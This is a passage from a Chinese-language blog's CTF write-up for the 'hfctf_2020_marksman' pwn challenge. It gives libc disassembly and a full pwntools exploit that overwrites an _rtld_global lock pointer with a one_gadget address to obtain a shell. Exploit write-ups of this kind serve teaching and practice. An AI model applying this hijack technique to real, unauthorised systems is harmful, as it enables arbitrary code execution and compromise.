<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x7fb239510379 &lt;exec_comm+2489&gt;:	cmp    eax,0xab39a</span><br><span class="line">0x7fb23951037e &lt;exec_comm+2494&gt;:	call   0x7fb239448cb0 &lt;__unsetenv&gt;</span><br><span class="line">0x7fb239510383 &lt;exec_comm+2499&gt;:	mov    edi,DWORD PTR [rsp+0x68]</span><br><span class="line">0x7fb239510387 &lt;exec_comm+2503&gt;:	call   0x7fb2395168c0 &lt;__GI___close&gt;</span><br><span class="line">0x7fb23951038c &lt;exec_comm+2508&gt;:	mov    rax,QWORD PTR [rip+0x2e0b15]        #one_gadget的起点</span><br><span class="line">0x7fb239510393 &lt;exec_comm+2515&gt;:	lea    rsi,[rsp+0x70]</span><br><span class="line">0x7fb239510398 &lt;exec_comm+2520&gt;:	lea    rdi,[rip+0xa9afb]</span><br><span class="line">0x7fb23951039f &lt;exec_comm+2527&gt;:	mov    rdx,QWORD PTR [rax]</span><br><span class="line">0x7fb2395103a2 &lt;exec_comm+2530&gt;:	call   0x7fb2394eae30 &lt;execve&gt;</span><br></pre></td></tr></table></figure>

<p>发现<code>0x10a38c</code>上面的一条命令是<code>call close</code>，这条命令应该不会影响程序最后的执行，所以我们以<code>0x10a387</code>为one_gadget的起点，这样就饶过了写入字节的限制。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./hfctf_2020_marksman&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/giantbranch/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - (<span class="number">0x7fe027d2e9c0</span> - <span class="number">0x00007fe027cae000</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rtld_global = libc_base + <span class="number">8507488</span></span><br><span class="line">addr = rtld_global + <span class="number">3840</span></span><br><span class="line">og = libc_base + <span class="number">0x10a387</span></span><br><span class="line">a = og&amp;<span class="number">0xff</span></span><br><span class="line">b = (og&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span></span><br><span class="line">c = (og&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;shoot!shoot!&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;biang!&quot;</span>,p8(a))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;biang!&quot;</span>,p8(b))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;biang!&quot;</span>,p8(c))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>经过调试发现劫持<code>__rtld_lock_lock_recursive</code>或者<code>__rtld_lock_unlock_recursive</code>最后都能执行<code>one_gadget</code>，但是劫持<code>__rtld_lock_unlock_recursive</code>时就是拿不到shell，可能是执行这两个函数时栈环境不太一样导致的。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">John Doe</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">64</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
